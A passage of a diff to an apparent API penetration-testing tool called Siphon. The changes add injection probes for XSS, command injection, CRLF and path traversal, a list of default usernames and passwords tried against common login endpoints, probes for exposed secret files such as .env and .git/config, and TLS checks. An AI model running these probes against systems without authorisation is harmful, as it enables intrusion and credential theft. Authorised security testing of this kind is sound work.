+        if _shutdown_requested:
+            break
+        url = root + ep["path"]
+        method = ep["method"]
+        params = ep.get("params", []) or []
+        body_fields = ep.get("body_fields", []) or []
+        test_params = [p["name"] for p in params] + body_fields
+        if not test_params:
+            test_params = ["q", "search", "name", "text", "message"]
+        for param in test_params[:3]:
+            for payload in _XSS_PAYLOADS[:3]:
+                resp = _test_injection(sess, url, method, param, payload, timeout)
+                if resp and payload in resp.text:
+                    output.add_finding(
+                        phase="injection",
+                        title="Reflected Cross-Site Scripting (XSS) in API Response",
+                        severity="HIGH",
+                        url=url,
+                        detail=(f"XSS payload reflected unescaped in API response for parameter '{param}'. "
+                                f"Payload: {payload}"),
+                        evidence=f"Response contains unescaped payload: {resp.text[:200]}",
+                        remediation="Encode all user-supplied output. Set Content-Type to application/json. Implement CSP.",
+                    )
+                    break
+
+    # Command Injection
+    for ep in test_endpoints[:10]:
+        if _shutdown_requested:
+            break
+        url = root + ep["path"]
+        method = ep["method"]
+        params = ep.get("params", []) or []
+        body_fields = ep.get("body_fields", []) or []
+        test_params = [p["name"] for p in params] + body_fields
+        if not test_params:
+            test_params = ["cmd", "exec", "command", "run", "host", "ping", "name"]
+        for param in test_params[:3]:
+            for cmd_pay, cmd_pat in _CMD_PAYLOADS[:2]:
+                resp = _test_injection(sess, url, method, param, "test" + cmd_pay, timeout)
+                if resp and cmd_pat.search(resp.text):
+                    output.add_finding(
+                        phase="injection",
+                        title="OS Command Injection in API Parameter",
+                        severity="CRITICAL",
+                        url=url,
+                        detail=(f"OS command injection detected in parameter '{param}' "
+                                f"with payload: test{cmd_pay}"),
+                        evidence=f"uid= pattern found in response: {resp.text[:300]}",
+                        remediation="Never pass user input to OS calls. Use allow-listed commands with no user input in arguments.",
+                    )
+                    break
+
+    # CRLF Injection
+    for ep in test_endpoints[:10]:
+        if _shutdown_requested:
+            break
+        url = root + ep["path"]
+        method = ep["method"]
+        params = ep.get("params", []) or []
+        body_fields = ep.get("body_fields", []) or []
+        test_params = [p["name"] for p in params] + body_fields
+        if not test_params:
+            test_params = ["redirect", "url", "next", "return", "location", "name"]
+        for param in test_params[:3]:
+            resp = _test_injection(sess, url, method, param, _CRLF_INJECTION_HEADER, timeout)
+            if resp and ("Siphon-Injected" in resp.text or
+                         "Siphon-Injected" in str(resp.headers)):
+                output.add_finding(
+                    phase="injection",
+                    title="CRLF Injection in API Parameter",
+                    severity="HIGH",
+                    url=url,
+                    detail=(f"CRLF sequence injected via parameter '{param}' was reflected "
+                            f"in response headers or body."),
+                    evidence=f"Parameter: {param}  Payload: {_CRLF_INJECTION_HEADER}",
+                    remediation="Strip \\r and \\n from any user input used in HTTP headers or responses.",
+                )
+                break
+
+    # Path Traversal / LFI
+    for ep in test_endpoints[:15]:
+        if _shutdown_requested:
+            break
+        url = root + ep["path"]
+        method = ep["method"]
+        params = ep.get("params", []) or []
+        body_fields = ep.get("body_fields", []) or []
+        test_params = [p["name"] for p in params] + body_fields
+        if not test_params:
+            test_params = ["file", "path", "page", "template", "include", "doc", "view"]
+        for param in test_params[:4]:
+            is_lfi = param.lower() in _LFI_PARAMS
+            payloads = _TRAVERSAL_PAYLOADS if is_lfi else _TRAVERSAL_PAYLOADS[:4]
+            for payload in payloads:
+                resp = _test_injection(sess, url, method, param, payload, timeout)
+                if resp and _TRAVERSAL_RE.search(resp.text):
+                    output.add_finding(
+                        phase="injection",
+                        title="Path Traversal / Local File Inclusion in API",
+                        severity="HIGH",
+                        url=url,
+                        detail=(f"Path traversal in parameter '{param}' disclosed file contents. "
+                                f"Payload: {payload}"),
+                        evidence=f"File content excerpt: {resp.text[:300]}",
+                        remediation="Validate file path inputs. Use allow-lists. Never expose filesystem paths via API parameters.",
+                    )
+                    break
+
     con.status("injection", "done", "Injection tests complete")
 
 
 # ---------------------------------------------------------------------------
 # Phase 4: Auth Bypass — JWT none-alg, weak HMAC, missing auth
 # ---------------------------------------------------------------------------
+
+_DEFAULT_API_CREDS = [
+    ("admin",  "admin"),
+    ("admin",  "password"),
+    ("admin",  "123456"),
+    ("admin",  "admin123"),
+    ("admin",  "password123"),
+    ("admin",  ""),
+    ("test",   "test"),
+    ("root",   "root"),
+    ("root",   "toor"),
+    ("user",   "user"),
+    ("guest",  "guest"),
+    ("api",    "api"),
+    ("admin",  "changeme"),
+    ("admin",  "secret"),
+]
+_DEFAULT_CRED_PATHS = [
+    "/api/login", "/api/auth/login", "/auth/login",
+    "/api/v1/login", "/api/v1/auth/login", "/api/v2/auth/login",
+    "/login", "/auth", "/api/token", "/oauth/token",
+    "/api/sessions", "/api/user/login", "/api/auth/token",
+    "/api/admin/login", "/admin/login",
+]
 
 _WEAK_JWT_SECRETS = [
     "secret", "password", "123456", "jwt_secret", "api_key",
@@ -1468,6 +2264,42 @@ def phase_auth_bypass(settings: dict, sess: requests.Session,
         # Probe base URL
         auth_endpoints = [{"method": "GET", "path": target["path"] or "/",
                            "params": [], "body_fields": [], "auth_required": True}]
+
+    # 0. Default credential testing against common API login endpoints
+    cred_sess = _make_session(settings)
+    for login_path in _DEFAULT_CRED_PATHS:
+        login_url = root + login_path
+        # Quick probe to see if path exists
+        probe = _safe_get(cred_sess, login_url, timeout=timeout)
+        if not probe or probe.status_code in (404, 410, 501):
+            continue
+        for uname, pwd in _DEFAULT_API_CREDS:
+            try:
+                resp = cred_sess.post(
+                    login_url,
+                    json={"username": uname, "password": pwd},
+                    timeout=timeout,
+                )
+                # Heuristic: 200/201 with no error keywords = success
+                if resp.status_code in (200, 201) and not re.search(
+                    r'invalid|incorrect|failed|unauthorized|wrong|bad.*cred|error',
+                    resp.text, re.I
+                ):
+                    output.add_finding(
+                        phase="auth_bypass",
+                        title="Default Credentials Accepted on API Login Endpoint",
+                        severity="CRITICAL",
+                        url=login_url,
+                        detail=(f"API login endpoint accepted default credentials: "
+                                f"username='{uname}', password='{pwd}'."),
+                        evidence=f"POST {login_path} with default creds → HTTP {resp.status_code}: {resp.text[:200]}",
+                        remediation="Change default credentials. Enforce account lockout after failed attempts.",
+                    )
+                    break
+            except Exception:
+                pass
+        if _shutdown_requested:
+            break
 
     # 1. Test endpoints without auth (missing auth enforcement)
     anon_sess = _make_session(settings)
@@ -2701,6 +3533,191 @@ def phase_jwt(settings: dict, auth_sess, output: OutputManager,
 
 
 # ---------------------------------------------------------------------------
+# Phase 15: Sensitive File Exposure — API9: Improper Inventory Management
+# ---------------------------------------------------------------------------
+
+_API_SENSITIVE_FILES = [
+    # CRITICAL — secrets and credentials
+    ("/.env",                   "CRITICAL", ".env file exposed — may contain API keys, DB credentials, and secrets."),
+    ("/.env.local",             "CRITICAL", ".env.local file exposed — environment-specific secrets."),
+    ("/.env.production",        "CRITICAL", ".env.production exposed — production secrets and credentials."),
+    ("/.git/HEAD",              "CRITICAL", "Git repository HEAD exposed — full source code reconstruction possible."),
+    ("/.git/config",            "CRITICAL", "Git repository config exposed — may contain embedded credentials."),
+    ("/settings.py",            "CRITICAL", "Django settings exposed — contains SECRET_KEY, DB passwords, and API keys."),
+    ("/config/database.yml",    "CRITICAL", "Database config exposed — contains production credentials."),
+    ("/database.yml",           "CRITICAL", "Rails database config exposed — contains production DB credentials."),
+    ("/db.sql",                 "CRITICAL", "SQL dump exposed — full database contents including credentials."),
+    ("/dump.sql",               "CRITICAL", "SQL dump exposed — full database contents including credentials."),
+    ("/backup.sql",             "CRITICAL", "SQL backup exposed — full database contents."),
+    # HIGH — configuration and source disclosure
+    ("/config.json",            "HIGH",     "config.json exposed — may contain API keys, endpoints, and auth tokens."),
+    ("/config.yaml",            "HIGH",     "config.yaml exposed — may contain secrets and connection strings."),
+    ("/config.yml",             "HIGH",     "config.yml exposed — may contain secrets and connection strings."),
+    ("/application.properties", "HIGH",     "Spring application.properties exposed — contains DB and API credentials."),
+    ("/application.yml",        "HIGH",     "Spring application.yml exposed — contains DB and API credentials."),
+    ("/web.config",             "HIGH",     "IIS web.config exposed — may contain connection strings and API keys."),
+    ("/appsettings.json",       "HIGH",     "ASP.NET appsettings.json exposed — contains connection strings and secrets."),
+    ("/secrets.json",           "HIGH",     "secrets.json exposed — likely contains credentials or API tokens."),
+    ("/.htpasswd",              "HIGH",     ".htpasswd exposed — contains HTTP Basic Auth password hashes."),
+    # MEDIUM — infrastructure and dependency metadata
+    ("/docker-compose.yml",     "MEDIUM",   "docker-compose.yml exposed — service topology and potentially hardcoded secrets."),
+    ("/docker-compose.yaml",    "MEDIUM",   "docker-compose.yaml exposed — service topology and potentially hardcoded secrets."),
+    ("/Dockerfile",             "MEDIUM",   "Dockerfile exposed — base image, build steps, and environment config."),
+    ("/kubernetes.yml",         "MEDIUM",   "Kubernetes manifest exposed — service topology and config."),
+    ("/k8s.yml",                "MEDIUM",   "Kubernetes manifest exposed — service topology and config."),
+    ("/swagger.json",           "MEDIUM",   "swagger.json exposed — full API schema and endpoint inventory."),
+    ("/swagger.yaml",           "MEDIUM",   "swagger.yaml exposed — full API schema and endpoint inventory."),
+    ("/openapi.json",           "MEDIUM",   "openapi.json exposed — full API specification."),
+    ("/openapi.yaml",           "MEDIUM",   "openapi.yaml exposed — full API specification."),
+    ("/api-docs",               "MEDIUM",   "API documentation exposed — full endpoint inventory."),
+    ("/api/swagger.json",       "MEDIUM",   "swagger.json exposed at /api path — full API schema."),
+    ("/phpinfo.php",            "MEDIUM",   "PHP info page exposed — discloses version, modules, and server paths."),
+    ("/server-status",          "MEDIUM",   "Apache server-status exposed — discloses active requests and client IPs."),
+    # LOW — dependency metadata
+    ("/package.json",           "LOW",      "package.json exposed — Node.js dependency versions for CVE research."),
+    ("/requirements.txt",       "LOW",      "requirements.txt exposed — Python dependency versions for CVE research."),
+    ("/composer.json",          "LOW",      "composer.json exposed — PHP dependency versions for CVE research."),
+    ("/go.mod",                 "LOW",      "go.mod exposed — Go module dependency versions for CVE research."),
+    ("/Gemfile",                "LOW",      "Gemfile exposed — Ruby dependency versions for CVE research."),
+    ("/pom.xml",                "LOW",      "pom.xml exposed — Java/Maven dependency versions for CVE research."),
+    ("/.DS_Store",              "LOW",      ".DS_Store exposed — macOS directory structure metadata."),
+]
+
+
+def phase_sensitive_files(settings: dict, sess: requests.Session,
+                          output: OutputManager) -> None:
+    """Phase 15: Probe for sensitive files exposed at the API base URL."""
+    scan = settings["scan"]
+    base_url = scan["api_base_url"].rstrip("/")
+    timeout = scan.get("timeout", 10)
+
+    con.status("sensitive_files", "running", f"Probing {len(_API_SENSITIVE_FILES)} paths")
+
+    # Detect wildcard/catch-all: if random path returns 200, validate all hits
+    import secrets as _s
+    _rnd = f"/siphon-{_s.token_hex(8)}-notfound"
+    _wc_resp = _safe_get(sess, base_url + _rnd, timeout=timeout)
+    _wc_body = _wc_resp.text if (_wc_resp and _wc_resp.status_code == 200) else None
+    _wc_len  = len(_wc_body) if _wc_body else 0
+
+    for fpath, severity, desc in _API_SENSITIVE_FILES:
+        if _shutdown_requested:
+            break
+        try:
+            resp = sess.get(base_url + fpath, timeout=timeout, allow_redirects=False)
+            if resp.status_code != 200 or len(resp.text) < 5:
+                continue
+            # Skip if response matches wildcard baseline (same length ±20 bytes)
+            if _wc_body and abs(len(resp.text) - _wc_len) < 20:
+                continue
+            output.add_finding(
+                phase="sensitive_files",
+                title=f"Sensitive File Exposed: {fpath}",
+                severity=severity,
+                url=base_url + fpath,
+                detail=desc + f" ({base_url + fpath} returned HTTP 200).",
+                evidence=f"HTTP 200  Content excerpt: {resp.text[:300]}",
+                remediation=f"Remove or restrict access to {fpath}. Ensure web server does not serve config files.",
+            )
+        except Exception:
+            pass
+
+    con.status("sensitive_files", "done", "Sensitive file probing complete")
+
+
+# ---------------------------------------------------------------------------
+# Phase 16: TLS Analysis — API8: Security Misconfiguration
+# ---------------------------------------------------------------------------
+
+def phase_tls(settings: dict, output: OutputManager) -> None:
+    """Phase 16: TLS/SSL analysis using testssl.sh or sslscan."""
+    scan = settings["scan"]
+    base_url = scan["api_base_url"]
+    timeout = scan.get("timeout", 10)
+    target = _parse_target(base_url)
+
+    host = target["host"]
+    port = target["port"]
+    host_port = f"{host}:{port}"
+
+    con.status("tls", "running", f"TLS analysis on {host_port}")
+
+    # Try sslscan first
+    sslscan = shutil.which("sslscan")
+    testssl = shutil.which("testssl.sh") or shutil.which("testssl")
+
+    if not sslscan and not testssl:
+        con.warn("[tls] Neither sslscan nor testssl.sh found — install one for TLS analysis")
+        con.status("tls", "skip", "No TLS tool available")
+        return
+
+    _TLS_VULN_PATTERNS = {
+        "SSLv2 Enabled":         (re.compile(r'SSLv2\s+enabled', re.I),    "CRITICAL"),
+        "SSLv3 Enabled":         (re.compile(r'SSLv3\s+enabled', re.I),    "HIGH"),
+        "TLSv1.0 Enabled":       (re.compile(r'TLSv1\.0\s+enabled', re.I), "MEDIUM"),
+        "TLSv1.1 Enabled":       (re.compile(r'TLSv1\.1\s+enabled', re.I), "MEDIUM"),
+        "RC4 Cipher Accepted":   (re.compile(r'RC4',               re.I),   "HIGH"),
+        "NULL Cipher Accepted":  (re.compile(r'NULL',              re.I),   "CRITICAL"),
+        "EXPORT Cipher Accepted":(re.compile(r'EXPORT',            re.I),   "HIGH"),
+        "DES Cipher Accepted":   (re.compile(r'\bDES\b',           re.I),   "HIGH"),
+        "Heartbleed":            (re.compile(r'heartbleed',        re.I),   "CRITICAL"),
+        "POODLE":                (re.compile(r'poodle',            re.I),   "HIGH"),
+        "BEAST":                 (re.compile(r'\bBEAST\b',         re.I),   "MEDIUM"),
+        "CRIME":                 (re.compile(r'\bCRIME\b',         re.I),   "MEDIUM"),
+        "DROWN":                 (re.compile(r'\bDROWN\b',         re.I),   "HIGH"),
+        "LOGJAM":                (re.compile(r'\bLOGJAM\b',        re.I),   "HIGH"),
+        "FREAK":                 (re.compile(r'\bFREAK\b',         re.I),   "HIGH"),
+        "SWEET32":               (re.compile(r'sweet32|3DES',      re.I),   "MEDIUM"),
+        "Self-Signed Cert":      (re.compile(r'self.?signed',      re.I),   "HIGH"),
+        "Expired Certificate":   (re.compile(r'certif.*expir|expir.*certif', re.I), "HIGH"),
+    }
+
+    tool_output = ""
+
+    if sslscan:
+        try:
+            result = subprocess.run(
+                [sslscan, "--no-colour", host_port],
+                capture_output=True, text=True, timeout=60
+            )
+            tool_output = result.stdout + result.stderr
+        except Exception as e:
+            con.warn(f"[tls] sslscan error: {e}")
+
+    if testssl and not tool_output:
+        try:
+            result = subprocess.run(
+                [testssl, "--fast", "--quiet", host_port],
+                capture_output=True, text=True, timeout=120
+            )
+            tool_output = result.stdout + result.stderr
+        except Exception as e:
+            con.warn(f"[tls] testssl error: {e}")
+
+    if not tool_output:
+        con.status("tls", "skip", "TLS tool produced no output")
+        return
+
+    for vuln_name, (pat, severity) in _TLS_VULN_PATTERNS.items():
+        if pat.search(tool_output):
+            output.add_finding(
+                phase="tls",
+                title=f"TLS Vulnerability: {vuln_name}",
+                severity=severity,
+                url=base_url,
+                detail=f"{vuln_name} detected on {host_port}.",
+                evidence=f"TLS tool output matched pattern for: {vuln_name}",
+                remediation=(
+                    "Disable deprecated TLS protocols and weak cipher suites. "
+                    "Use TLSv1.2+ with strong cipher suites only. "
+                    "Renew expired or self-signed certificates."
+                ),
+            )
+
+    con.status("tls", "done", f"TLS analysis complete for {host_port}")
+
+
+# ---------------------------------------------------------------------------
 # main()
 # ---------------------------------------------------------------------------
 
@@ -2726,7 +3743,7 @@ def main() -> None:
     settings = _apply_args(settings, args)
     scan = settings["scan"]
 
-    # Auto-compute structured project path from engagement fields if not explicitly set
+    # Auto-compute structured project path from engagement fields if not set
     if not scan.get("project"):
         eng = settings.get("engagement", {})
         scan["project"] = str(_build_project_dir(
@@ -2735,293 +3752,354 @@ def main() -> None:
             "siphon",
         ))
 
-    # Validate target
-    if not scan["api_base_url"]:
+    # Build deduped URL list: primary + extras
+    _primary = scan.get("api_base_url", "").rstrip("/")
+    _extras  = [u.rstrip("/") for u in scan.get("api_base_urls", []) if u]
+    if _primary:
+        base_urls = [_primary] + [u for u in _extras if u != _primary]
+    else:
+        base_urls = _extras
+    _seen_u: set = set()
+    base_urls = [u for u in base_urls if u not in _seen_u and not _seen_u.add(u)]
+
+    if not base_urls:
         con.err("No API base URL specified. Use --url or set scan.api_base_url in settings.")
         sys.exit(1)
 
-    target = _parse_target(scan["api_base_url"])
-    con.info(f"Target   : {target['url']}")
+    con.info(f"Target(s): {', '.join(base_urls)}")
     con.info(f"Project  : {scan['project']}")
     con.info(f"Threads  : {scan['threads']}")
     con.info(f"Timeout  : {scan['timeout']}s")
     if scan.get("proxy"):
         con.info(f"Proxy    : {scan['proxy']}")
+    _spec_files = scan.get("api_spec_files") or ([scan["openapi_url"]] if scan.get("openapi_url") else [])
+    if _spec_files:
+        con.info(f"Spec file(s): {', '.join(_spec_files)}")
 
-    # Phase flags
-    phases_cfg = scan.get("phases", {})
+    # ------------------------------------------------------------------ #
+    # Per-target loop (mirrors Fracture multi-URL pattern)                #
+    # ------------------------------------------------------------------ #
+    for raw_url in base_urls:
+        if not raw_url:
+            continue
 
-    def _skip(phase: str) -> bool:
-        return not phases_cfg.get(phase, True)
+        # Per-URL settings copy so mutations don't bleed across targets
+        t_settings = copy.deepcopy(settings)
+        t_scan = t_settings["scan"]
+        t_scan["api_base_url"] = raw_url
 
-    # Build HTTP sessions
-    sess       = _make_session(settings)
-    auth_sess  = _build_auth_session(settings, "auth")
-    auth2_sess = _build_auth_session(settings, "auth2")
+        target = _parse_target(raw_url)
 
-    if auth_sess:
-        con.info("Auth     : enabled (primary)")
-    if auth2_sess:
-        con.info("Auth2    : enabled (secondary)")
+        # Per-URL output sub-directory when scanning multiple targets
+        base_project = Path(scan["project"]).resolve()
+        if len(base_urls) > 1:
+            safe_host = re.sub(r'[^\w._-]', '_', target["host"])
+            project_dir = base_project / safe_host
+        else:
+            project_dir = base_project
+        t_scan["project"] = str(project_dir)
 
-    # Output manager
-    output = OutputManager(scan["project"])
-    eng = settings.get("engagement", {})
-    _write_project_meta(
-        Path(scan["project"]).resolve(),
-        tool="siphon",
-        client_short=eng.get("client_short", ""),
-        year=(eng.get("start_date", "") or "")[:4] or datetime.now().strftime("%Y"),
-        version=VERSION,
-    )
+        output = OutputManager(str(project_dir))
+        eng = settings.get("engagement", {})
+        _write_project_meta(
+            base_project,
+            tool="siphon",
+            client_short=eng.get("client_short", ""),
+            year=(eng.get("start_date", "") or "")[:4] or datetime.now().strftime("%Y"),
+            version=VERSION,
+        )
 
-    # Shared API inventory (populated by discovery, used by later phases)
-    api_inventory: list = []
+        phases_cfg = t_scan.get("phases", {})
 
-    con.section("Starting Siphon API Penetration Test")
+        def _skip(phase: str) -> bool:
+            return not phases_cfg.get(phase, True)
 
-    # ------------------------------------------------------------------
-    # Phase 0: Discovery
-    # ------------------------------------------------------------------
-    if not _skip("discovery"):
-        try:
-            api_inventory = phase_discovery(settings, sess, output)
-        except Exception as exc:
-            con.err(f"Phase discovery error: {exc}")
-    else:
-        con.status("discovery", "skip", "Disabled in settings")
+        sess       = _make_session(t_settings)
+        auth_sess  = _build_auth_session(t_settings, "auth")
+        auth2_sess = _build_auth_session(t_settings, "auth2")
 
-    if _shutdown_requested:
+        if auth_sess:
+            con.info("Auth     : enabled (primary)")
+        if auth2_sess:
+            con.info("Auth2    : enabled (secondary)")
+
+        api_inventory: list = []
+
+        con.section(f"Siphon — {raw_url}")
+
+        # ------------------------------------------------------------------
+        # Phase 0: Discovery
+        # ------------------------------------------------------------------
+        if not _skip("discovery"):
+            try:
+                api_inventory = phase_discovery(t_settings, sess, output)
+            except Exception as exc:
+                con.err(f"Phase discovery error: {exc}")
+        else:
+            con.status("discovery", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 1: Recon
+        # ------------------------------------------------------------------
+        if not _skip("recon"):
+            try:
+                phase_recon(t_settings, sess, output)
+            except Exception as exc:
+                con.err(f"Phase recon error: {exc}")
+        else:
+            con.status("recon", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 2: Fuzzing
+        # ------------------------------------------------------------------
+        if not _skip("fuzzing"):
+            try:
+                phase_fuzzing(t_settings, sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase fuzzing error: {exc}")
+        else:
+            con.status("fuzzing", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 3: Injection
+        # ------------------------------------------------------------------
+        if not _skip("injection"):
+            try:
+                phase_injection(t_settings, sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase injection error: {exc}")
+        else:
+            con.status("injection", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 4: Auth Bypass
+        # ------------------------------------------------------------------
+        if not _skip("auth_bypass"):
+            try:
+                phase_auth_bypass(t_settings, sess, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase auth_bypass error: {exc}")
+        else:
+            con.status("auth_bypass", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 5: Rate Limiting
+        # ------------------------------------------------------------------
+        if not _skip("rate_limiting"):
+            try:
+                phase_rate_limiting(t_settings, sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase rate_limiting error: {exc}")
+        else:
+            con.status("rate_limiting", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 6: Mass Assignment
+        # ------------------------------------------------------------------
+        if not _skip("mass_assignment"):
+            try:
+                phase_mass_assignment(t_settings, sess, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase mass_assignment error: {exc}")
+        else:
+            con.status("mass_assignment", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 7: SSRF
+        # ------------------------------------------------------------------
+        if not _skip("ssrf"):
+            try:
+                phase_ssrf(t_settings, sess, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase ssrf error: {exc}")
+        else:
+            con.status("ssrf", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 8: Data Exposure
+        # ------------------------------------------------------------------
+        if not _skip("data_exposure"):
+            try:
+                phase_data_exposure(t_settings, sess, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase data_exposure error: {exc}")
+        else:
+            con.status("data_exposure", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 9: GraphQL
+        # ------------------------------------------------------------------
+        if not _skip("graphql"):
+            try:
+                phase_graphql(t_settings, sess, auth_sess, output)
+            except Exception as exc:
+                con.err(f"Phase graphql error: {exc}")
+        else:
+            con.status("graphql", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 10: BOLA
+        # ------------------------------------------------------------------
+        if not _skip("bola"):
+            try:
+                phase_bola(t_settings, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase bola error: {exc}")
+        else:
+            con.status("bola", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 11: BFLA
+        # ------------------------------------------------------------------
+        if not _skip("bfla"):
+            try:
+                phase_bfla(t_settings, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase bfla error: {exc}")
+        else:
+            con.status("bfla", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 12: Cross-User
+        # ------------------------------------------------------------------
+        if not _skip("cross_user"):
+            try:
+                phase_cross_user(t_settings, auth_sess, auth2_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase cross_user error: {exc}")
+        else:
+            con.status("cross_user", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 13: Session
+        # ------------------------------------------------------------------
+        if not _skip("session"):
+            try:
+                phase_session(t_settings, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase session error: {exc}")
+        else:
+            con.status("session", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 14: JWT
+        # ------------------------------------------------------------------
+        if not _skip("jwt"):
+            try:
+                phase_jwt(t_settings, auth_sess, output, api_inventory)
+            except Exception as exc:
+                con.err(f"Phase jwt error: {exc}")
+        else:
+            con.status("jwt", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 15: Sensitive Files
+        # ------------------------------------------------------------------
+        if not _skip("sensitive_files"):
+            try:
+                phase_sensitive_files(t_settings, sess, output)
+            except Exception as exc:
+                con.err(f"Phase sensitive_files error: {exc}")
+        else:
+            con.status("sensitive_files", "skip", "Disabled in settings")
+
+        if _shutdown_requested:
+            output.save_all(api_inventory)
+            output.print_summary()
+            sys.exit(0)
+
+        # ------------------------------------------------------------------
+        # Phase 16: TLS
+        # ------------------------------------------------------------------
+        if not _skip("tls"):
+            try:
+                phase_tls(t_settings, output)
+            except Exception as exc:
+                con.err(f"Phase tls error: {exc}")
+        else:
+            con.status("tls", "skip", "Disabled in settings")
+
+        # ------------------------------------------------------------------
+        # Save results for this target
+        # ------------------------------------------------------------------
         output.save_all(api_inventory)
         output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 1: Recon
-    # ------------------------------------------------------------------
-    if not _skip("recon"):
-        try:
-            phase_recon(settings, sess, output)
-        except Exception as exc:
-            con.err(f"Phase recon error: {exc}")
-    else:
-        con.status("recon", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 2: Fuzzing
-    # ------------------------------------------------------------------
-    if not _skip("fuzzing"):
-        try:
-            phase_fuzzing(settings, sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase fuzzing error: {exc}")
-    else:
-        con.status("fuzzing", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 3: Injection
-    # ------------------------------------------------------------------
-    if not _skip("injection"):
-        try:
-            phase_injection(settings, sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase injection error: {exc}")
-    else:
-        con.status("injection", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 4: Auth Bypass
-    # ------------------------------------------------------------------
-    if not _skip("auth_bypass"):
-        try:
-            phase_auth_bypass(settings, sess, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase auth_bypass error: {exc}")
-    else:
-        con.status("auth_bypass", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 5: Rate Limiting
-    # ------------------------------------------------------------------
-    if not _skip("rate_limiting"):
-        try:
-            phase_rate_limiting(settings, sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase rate_limiting error: {exc}")
-    else:
-        con.status("rate_limiting", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 6: Mass Assignment
-    # ------------------------------------------------------------------
-    if not _skip("mass_assignment"):
-        try:
-            phase_mass_assignment(settings, sess, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase mass_assignment error: {exc}")
-    else:
-        con.status("mass_assignment", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 7: SSRF
-    # ------------------------------------------------------------------
-    if not _skip("ssrf"):
-        try:
-            phase_ssrf(settings, sess, auth_sess, output, api_inventory)
-        except Exception as exc:
-            con.err(f"Phase ssrf error: {exc}")
-    else:
-        con.status("ssrf", "skip", "Disabled in settings")
-
-    if _shutdown_requested:
-        output.save_all(api_inventory)
-        output.print_summary()
-        sys.exit(0)
-
-    # ------------------------------------------------------------------
-    # Phase 8: Data Exposure
-    # ------------------------------------------------------------------
-    if not _skip("data_exposure"):
-        try:
-            phase_data_exposure(settings, sess, auth_sess, output, api_inventory)
-        except Exception as exc:
